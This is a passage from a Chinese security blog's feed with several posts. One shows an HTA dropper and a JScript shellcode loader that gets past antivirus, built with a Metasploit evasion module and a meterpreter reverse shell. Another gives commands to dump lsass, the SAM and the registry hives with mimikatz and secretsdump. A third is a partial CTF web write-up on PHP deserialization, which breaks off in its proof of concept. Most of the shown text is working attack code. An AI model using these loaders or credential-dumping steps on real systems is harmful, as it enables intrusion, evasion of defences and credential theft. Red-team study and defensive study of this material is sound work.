var_obj</span><br><span class="line">Set var_obj = CreateObject(&quot;Scripting.FileSystemObject&quot;)</span><br><span class="line">Dim var_stream</span><br><span class="line">Dim var_tempdir</span><br><span class="line">Dim var_tempexe</span><br><span class="line">Dim var_basedir</span><br><span class="line">Set var_tempdir = var_obj.GetSpecialFolder(2)</span><br><span class="line">var_basedir = var_tempdir &amp; &quot;\&quot; &amp; var_obj.GetTempName()</span><br><span class="line">var_obj.CreateFolder(var_basedir)</span><br><span class="line">var_tempexe = var_basedir &amp; &quot;\&quot; &amp; &quot;evil.exe&quot;</span><br><span class="line">Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)</span><br><span class="line">For i = 1 to Len(var_shellcode) Step 2</span><br><span class="line">    var_stream.Write Chr(CLng(&quot;&amp;H&quot; &amp; Mid(var_shellcode,i,2)))</span><br><span class="line">Next</span><br><span class="line">var_stream.Close</span><br><span class="line">Dim var_shell</span><br><span class="line">Set var_shell = CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">var_shell.run var_tempexe, 0, true</span><br><span class="line">var_obj.DeleteFile(var_tempexe)</span><br><span class="line">var_obj.DeleteFolder(var_basedir)</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">var_func</span><br><span class="line">self.close</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>可以看到shellcode为PE格式，执行调用<strong>Wscript.shell</strong></p><p>同样会被Defender拦截</p><h2 id="0x04-MetaSploit-windows-defender-js-hta"><a href="#0x04-MetaSploit-windows-defender-js-hta" class="headerlink" title="0x04 MetaSploit::windows_defender_js_hta"></a>0x04 MetaSploit::windows_defender_js_hta</h2><p>Msf5更新后新加入了两个evasion</p><ul><li>evasion/windows/windows_defender_exe    </li><li>evasion/windows/windows_defender_js_hta</li></ul><p>exe报毒有点惨淡<br><img src="/Command Execute By mshta.resources/B6C6E6B0-3C41-42D7-BF90-D9A56BC9A978.png" alt="3e2ff0218d8efce1f3709b339560c13e"></p><p>但是defender和火绒还是没关系的<br><img src="/Command Execute By mshta.resources/75AFC5D0-7E89-46F7-86ED-61BAB04C8FB7.png" alt="dc2b1ad02452c9baafe83eae5ee3d588"></p><p>hta文件<br><img src="/Command Execute By mshta.resources/4CE33D9E-5EC8-406F-82E9-16346C446AC9.png" alt="d83749536340df88df744509897dc80a"><br>Defender,火绒，360都能过<br><img src="/Command Execute By mshta.resources/EBD86609-7BFE-4000-84DA-F44CE9DEFE45.png" alt="0533eaf110cdcc3a1583fd3e03cb12ed"></p><figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use evasion/windows/windows_defender_js_hta</span><br><span class="line">msf5 evasion(windows/windows_defender_js_hta) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf5 evasion(windows/windows_defender_js_hta) &gt; <span class="built_in">set</span> lhost 192.168.1</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.1.105  <span class="built_in">set</span> lhost 192.168.121.1</span><br><span class="line">msf5 evasion(windows/windows_defender_js_hta) &gt; <span class="built_in">set</span> lhost 192.168.1.105</span><br><span class="line">lhost =&gt; 192.168.1.105</span><br><span class="line">msf5 evasion(windows/windows_defender_js_hta) &gt; <span class="built_in">set</span> lport 8877</span><br><span class="line">lport =&gt; 8877</span><br><span class="line">msf5 evasion(windows/windows_defender_js_hta) &gt; exploit</span><br><span class="line"></span><br><span class="line">[+] QWZwXErrm.hta stored at /Users/patrilic/.msf4/<span class="built_in">local</span>/QWZwXErrm.hta</span><br></pre></td></tr></table></figure><p>核心代码<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> System;</span><br><span class="line"><span class="keyword">import</span> System.Runtime.InteropServices;</span><br><span class="line"><span class="keyword">import</span> System.Reflection;</span><br><span class="line"><span class="keyword">import</span> System.Reflection.Emit;</span><br><span class="line"><span class="keyword">import</span> System.Runtime;</span><br><span class="line"><span class="keyword">import</span> System.Text;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">InvokeWin32</span>(<span class="params">dllName:String, returnType:Type,</span></span></span><br><span class="line"><span class="function"><span class="params">  methodName:String, parameterTypes:Type[], parameters:Object[]</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// Begin to build the dynamic assembly</span></span><br><span class="line">  <span class="keyword">var</span> domain = AppDomain.CurrentDomain;</span><br><span class="line">  <span class="keyword">var</span> name = <span class="keyword">new</span> System.Reflection.AssemblyName(<span class="string">'PInvokeAssembly'</span>);</span><br><span class="line">  <span class="keyword">var</span> assembly = domain.DefineDynamicAssembly(name, AssemblyBuilderAccess.Run);</span><br><span class="line">  <span class="keyword">var</span> <span class="built_in">module</span> = assembly.DefineDynamicModule(<span class="string">'PInvokeModule'</span>);</span><br><span class="line">  <span class="keyword">var</span> type = <span class="built_in">module</span>.DefineType(<span class="string">'PInvokeType'</span>,TypeAttributes.Public + TypeAttributes.BeforeFieldInit);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Define the actual P/Invoke method</span></span><br><span class="line">  <span class="keyword">var</span> method = type.DefineMethod(methodName, MethodAttributes.Public + MethodAttributes.HideBySig + MethodAttributes.Static + MethodAttributes.PinvokeImpl, returnType, parameterTypes);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Apply the P/Invoke constructor</span></span><br><span class="line">  <span class="keyword">var</span> ctor = System.Runtime.InteropServices.DllImportAttribute.GetConstructor([Type.GetType(<span class="string">"System.String"</span>)]);</span><br><span class="line">  <span class="keyword">var</span> attr = <span class="keyword">new</span> System.Reflection.Emit.CustomAttributeBuilder(ctor, [dllName]);</span><br><span class="line">  method.SetCustomAttribute(attr);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Create the temporary type, and invoke the method.</span></span><br><span class="line">  <span class="keyword">var</span> realType = type.CreateType();</span><br><span class="line">  <span class="keyword">return</span> realType.InvokeMember(methodName, BindingFlags.Public + BindingFlags.Static + BindingFlags.InvokeMethod, <span class="literal">null</span>, <span class="literal">null</span>, parameters);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">VirtualAlloc</span>(<span class="params"> lpStartAddr:UInt32, size:UInt32, flAllocationType:UInt32, flProtect:UInt32</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">var</span> parameterTypes:Type[] = [Type.GetType(<span class="string">"System.UInt32"</span>),Type.GetType(<span class="string">"System.UInt32"</span>),Type.GetType(<span class="string">"System.UInt32"</span>),Type.GetType(<span class="string">"System.UInt32"</span>)];</span><br><span class="line">  <span class="keyword">var</span> parameters:<span class="built_in">Object</span>[] = [lpStartAddr, size, flAllocationType, flProtect];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> InvokeWin32(<span class="string">"kernel32.dll"</span>, Type.GetType(<span class="string">"System.IntPtr"</span>), <span class="string">"VirtualAlloc"</span>, parameterTypes,  parameters );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CreateThread</span>(<span class="params"> lpThreadAttributes:UInt32, dwStackSize:UInt32, lpStartAddress:IntPtr, param:IntPtr, dwCreationFlags:UInt32, lpThreadId:UInt32</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">var</span> parameterTypes:Type[] = [Type.GetType(<span class="string">"System.UInt32"</span>),Type.GetType(<span class="string">"System.UInt32"</span>),Type.GetType(<span class="string">"System.IntPtr"</span>),Type.GetType(<span class="string">"System.IntPtr"</span>), Type.GetType(<span class="string">"System.UInt32"</span>), Type.GetType(<span class="string">"System.UInt32"</span>) ];</span><br><span class="line">  <span class="keyword">var</span> parameters:<span class="built_in">Object</span>[] = [lpThreadAttributes, dwStackSize, lpStartAddress, param, dwCreationFlags, lpThreadId ];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> InvokeWin32(<span class="string">"kernel32.dll"</span>, Type.GetType(<span class="string">"System.IntPtr"</span>), <span class="string">"CreateThread"</span>, parameterTypes,  parameters );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">WaitForSingleObject</span>(<span class="params"> handle:IntPtr, dwMiliseconds:UInt32</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">var</span> parameterTypes:Type[] = [Type.GetType(<span class="string">"System.IntPtr"</span>),Type.GetType(<span class="string">"System.UInt32"</span>)];</span><br><span class="line">  <span class="keyword">var</span> parameters:<span class="built_in">Object</span>[] = [handle, dwMiliseconds ];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> InvokeWin32(<span class="string">"kernel32.dll"</span>, Type.GetType(<span class="string">"System.IntPtr"</span>), <span class="string">"WaitForSingleObject"</span>, parameterTypes,  parameters );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ShellCodeExec</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">var</span> MEM_COMMIT:uint = <span class="number">0x1000</span>;</span><br><span class="line">  <span class="keyword">var</span> PAGE_EXECUTE_READWRITE:uint = <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> shellcodestr:<span class="built_in">String</span> = <span class="string">'/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCACKtwKgBaUFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0DEn/znXlaPC1olb/1UiD7BBIieJNMclqBEFYSIn5QboC2chf/9VIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//VSAHDSCnGSIX2deFB/+c='</span></span><br><span class="line">  <span class="keyword">var</span> shellcode:Byte[] = System.Convert.FromBase64String(shellcodestr);</span><br><span class="line">  <span class="keyword">var</span> funcAddr:IntPtr = VirtualAlloc(<span class="number">0</span>, UInt32(shellcode.Length),MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  Marshal.Copy(shellcode, <span class="number">0</span>, funcAddr, shellcode.Length);</span><br><span class="line">  <span class="keyword">var</span> hThread:IntPtr = IntPtr.Zero;</span><br><span class="line">  <span class="keyword">var</span> threadId:UInt32 = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// prepare data</span></span><br><span class="line">  <span class="keyword">var</span> pinfo:IntPtr = IntPtr.Zero;</span><br><span class="line">  <span class="comment">// execute native code</span></span><br><span class="line">  hThread = CreateThread(<span class="number">0</span>, <span class="number">0</span>, funcAddr, pinfo, <span class="number">0</span>, threadId);</span><br><span class="line">  WaitForSingleObject(hThread, <span class="number">0xFFFFFFFF</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">ShellCodeExec();</span><br><span class="line">&#125;<span class="keyword">catch</span>(e)&#123;&#125;</span><br></pre></td></tr></table></figure></p><p>hta代码片段<br><img src="/Command Execute By mshta.resources/A22F7D47-1CAA-4355-AF27-5A63E461D7D4.png" alt="a67569474b21379b1c9d6c0b41a63a4e"></p><p>Wscript.shell执行 </p><p>生成JS执行Shellcode</p><h3 id="0x05-LINKS"><a href="#0x05-LINKS" class="headerlink" title="0x05 LINKS"></a>0x05 LINKS</h3><p><a href="https://raw.githubusercontent.com/mdsecactivebreach/CACTUSTORCH/master/CACTUSTORCH.hta" target="_blank" rel="noopener">CACTUSTORCH.hta</a><br><a href="https://www.cnblogs.com/backlion/p/10491616.html" target="_blank" rel="noopener">使用mshta.exe绕过应用程序白名单（多种方法）</a><br><a href="https://github.com/Micropoor/Micro8/blob/master/%E7%AC%AC%E4%B8%83%E5%8D%81%E4%BA%94%E8%AF%BE%EF%BC%9A%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Mshta.exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E4%BA%94%E5%AD%A3.pdf" target="_blank" rel="noopener">第七十五课：基于白名单Mshta.exe执行payload第五季</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-05-08 11:20:33&lt;br&gt;&lt;img src=&quot;/wallpaper/[33657]天使の仕組み-60684267.png&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;
      
    
    </summary>
    
    
      <category term="命令执行" scheme="http://patrilic.top/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>常用 Windows 抓取Hash</title>
    <link href="http://patrilic.top/2019/05/05/Windows%20%E6%8A%93%E5%8F%96Hash/"/>
    <id>http://patrilic.top/2019/05/05/Windows 抓取Hash/</id>
    <published>2019-05-04T16:20:33.000Z</published>
    <updated>2019-08-16T05:13:10.362Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-05-05 0:20:33<br><img src="/wallpaper/[50033]Hotaru-64495434.png" alt><br><strong>推荐使用 Procdump，reg 和 sharpdump 导出本地，再想办法从内网中运出来本地破解</strong></p></blockquote><p>测试机器: Windows 10 1809</p><h2 id="0x01-Procdump-Mimikatz"><a href="#0x01-Procdump-Mimikatz" class="headerlink" title="0x01 Procdump + Mimikatz"></a>0x01 Procdump + Mimikatz</h2><p>Procdump<br>(管理员权限下运行)<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">temp</span>\<span class="title">procdump.exe</span> -<span class="title">accepteula</span> -<span class="title">ma</span> <span class="title">lsass.exe</span> <span class="title">lsass.dmp</span> //<span class="title">For</span> 32 <span class="title">bits</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">temp</span>\<span class="title">procdump.exe</span> -<span class="title">accepteula</span> -64 -<span class="title">ma</span> <span class="title">lsass.exe</span> <span class="title">lsass.dmp</span> //<span class="title">For</span> 64 <span class="title">bits</span></span></span><br></pre></td></tr></table></figure></p><p><img src="/Windows 抓取Hash.resources/5FE37FF2-25D9-45B1-851E-874383718EE9.png" alt="ac82bb7eeb7a22a8374cf6d938f39723"></p><p>然后本地解出hash即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::minidump C:\lsass.dmp</span><br><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure></p><p><img src="/Windows 抓取Hash.resources/BE8A461A-1A00-4764-BB1D-8C96C38779A4.png" alt="8217226578225fab9a1492a3aeca235d"></p><h2 id="0x02-Reg-impacket-Mimikatz-强推"><a href="#0x02-Reg-impacket-Mimikatz-强推" class="headerlink" title="0x02 Reg + impacket/Mimikatz (强推)"></a>0x02 Reg + impacket/Mimikatz (强推)</h2><p>使用<strong>Reg</strong>需要NT/SYSTEM权限<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM system.hiv</span><br><span class="line"></span><br><span class="line">reg save HKLM\SAM sam.hiv</span><br><span class="line"></span><br><span class="line">reg save HKLM\security security.hiv</span><br></pre></td></tr></table></figure></p><h3 id="Mimikatz-调用-lsadump"><a href="#Mimikatz-调用-lsadump" class="headerlink" title="Mimikatz 调用 lsadump"></a>Mimikatz 调用 lsadump</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::sam /system:system.hiv /sam:sam.hiv</span><br></pre></td></tr></table></figure><p><img src="/Windows 抓取Hash.resources/6FE3B05C-F2BD-4C78-B26D-E4BF0476BECE.png" alt="db38857f0f6c6dc2c9f9035664e6993d"></p><h3 id="impacket-secretsdump-py"><a href="#impacket-secretsdump-py" class="headerlink" title="impacket/secretsdump.py"></a>impacket/secretsdump.py</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py -sam sam.hiv -security security.hiv -system system.hiv LOCAL</span><br></pre></td></tr></table></figure><p><img src="/Windows 抓取Hash.resources/E7E2A416-FD55-4F50-A437-876466B61879.png" alt="242aff6a39bba29a99ef4947d7a99cc2"></p><h2 id="0x03-Sharpdump-强推"><a href="#0x03-Sharpdump-强推" class="headerlink" title="0x03 Sharpdump  (强推)"></a>0x03 Sharpdump  (强推)</h2><p>Out-Minidump.ps1 的 C#版本 编译结果<br>需要.NET 3.5版本框架<br><img src="/Windows 抓取Hash.resources/0895B794-5AA9-485E-85A2-F8130EAD8EC5.png" alt="45e9926e499fde1ffa70410d600137ee"></p><h2 id="0x04-Wce、Quarks-PwDump、GetPass……"><a href="#0x04-Wce、Quarks-PwDump、GetPass……" class="headerlink" title="0x04 Wce、Quarks PwDump、GetPass……"></a>0x04 Wce、Quarks PwDump、GetPass……</h2><p>没怎么用过，都是以前比较老的，Getpass是Mimikatz的编译版本，没啥意思</p><h2 id="0x05-Msf-modules"><a href="#0x05-Msf-modules" class="headerlink" title="0x05 Msf modules"></a>0x05 Msf modules</h2><h3 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h3><p>条件:</p><ol><li>Meterpreter Session</li><li>NT/SYSTEM</li></ol><p><img src="/Windows 抓取Hash.resources/2EB1A5C5-7939-4533-B30F-88DDD7CDB06F.png" alt="07030d8ceedbedabf174df555d21d903"></p><p>hashdump只能dump本地用户</p><h3 id="smart-hashdump"><a href="#smart-hashdump" class="headerlink" title="smart_hashdump"></a>smart_hashdump</h3><p>条件</p><ol><li>Meterpreter Session</li><li>NT/SYSTEM</li></ol><p><img src="/Windows 抓取Hash.resources/8985233C-E94F-49FE-9D8E-C6904AC4DD44.png" alt="ba9d49921ba6634abcc41e4ee0dfc0d1"></p><p>可以dump本地 + 域用户hash</p><h3 id="kiwi"><a href="#kiwi" class="headerlink" title="kiwi"></a>kiwi</h3><p>条件</p><ol><li>Meterpreter Session</li><li>NT/SYSTEM</li></ol><p><img src="/Windows 抓取Hash.resources/83900C86-A8C7-4190-B99A-AA696699C1B5.png" alt="0bb8fe85b3463c08b98173e8493190df"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-05-05 0:20:33&lt;br&gt;&lt;img src=&quot;/wallpaper/[50033]Hotaru-64495434.png&quot; alt&gt;&lt;br&gt;&lt;strong&gt;推荐使用 Proc
      
    
    </summary>
    
    
      <category term="内网渗透" scheme="http://patrilic.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>第十二届全国大学生信息安全竞赛初赛部分Web Write up</title>
    <link href="http://patrilic.top/2019/04/23/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9BWrite%20up/"/>
    <id>http://patrilic.top/2019/04/23/第十二届全国大学生信息安全竞赛初赛Write up/</id>
    <published>2019-04-23T03:20:33.000Z</published>
    <updated>2019-08-16T05:13:20.584Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-04-23 11:20:33<br><img src="/wallpaper/[30865]ジャンヌ-61097279.png" alt></p></blockquote><h2 id="Web1-JustSoso"><a href="#Web1-JustSoso" class="headerlink" title="Web1 - JustSoso"></a>Web1 - JustSoso</h2><p><strong>Index.php</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line"></span><br><span class="line">$payload = $_GET[<span class="string">"payload"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> $_GET[<span class="string">'file'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($payload)) &#123;</span><br><span class="line">    $url = parse_url($_SERVER[<span class="string">'REQUEST_URI'</span>]);</span><br><span class="line">    parse_str($url[<span class="string">'query'</span>], $query);</span><br><span class="line">    <span class="keyword">foreach</span> ($query <span class="keyword">as</span> $value) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/flag/"</span>, $value)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'gg'</span>;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $payload = unserialize($payload);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Missing parameters"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><strong>Hint.php</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $handle;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 绕过wakeup</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Waking up\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = $handle;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle-&gt;getFlag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> $token_flag;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>, <span class="number">10000</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>, <span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><strong>poc.php</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">"hint.php"</span>;</span><br><span class="line"></span><br><span class="line">$flag = <span class="keyword">new</span> 